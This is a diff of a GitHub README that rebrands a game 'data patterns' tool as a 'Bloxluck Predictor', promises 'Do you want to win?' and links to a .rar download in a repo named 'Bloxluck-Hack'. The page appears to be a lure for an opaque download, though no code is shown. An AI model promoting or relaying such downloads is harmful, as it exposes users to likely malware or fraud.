@@ -1,19 +1,23 @@
-<p align="center">
-  <img src="./icon.png" alt="Logo" width="200" height="200">
-</p>
+<h1 align="center">
+  <a href="https://github.com/tradescamv2/ba-l-yoruz/tree/main?tab=readme-ov-file">
+    <img src="./icon.png" alt="Logo" width="300" height="300" style="background:white; vertical-align: middle;">
+  </a>
+</h1>
+
 
 <div align="center">
-  <h3>BloxWin</h3>
-  A tool for analyzing data patterns in browser-based games.
+  <h3>Bloxluck Predictor</h3>
+   Do you want to win?
+  <br />
+  <br />
 </div>
 
+
 <p align="center">
-  <a href="https://github.com/tradescamv2/blox-luck-hack/tree/main" target="_blank">
-    <img src="https://img.shields.io/badge/Download-Bloxwin%20Tool-brightgreen?style=for-the-badge&logo=roblox&logoColor=white" alt="Download Bloxwin Tool" />
+  <a href="https://github.com/tradescamv2/Bloxluck-Hack/releases/download/Bloxluck/Bloxluck.Predictor.rar" target="_blank">
+    <img src="https://img.shields.io/badge/Download-Bloxluck%20Predictor-brightgreen?style=for-the-badge&logo=roblox&logoColor=white" alt="Download Bloxluck Predictor" />
   </a>
 </p>
-
-<br/>
 
 ## 📖 About
 
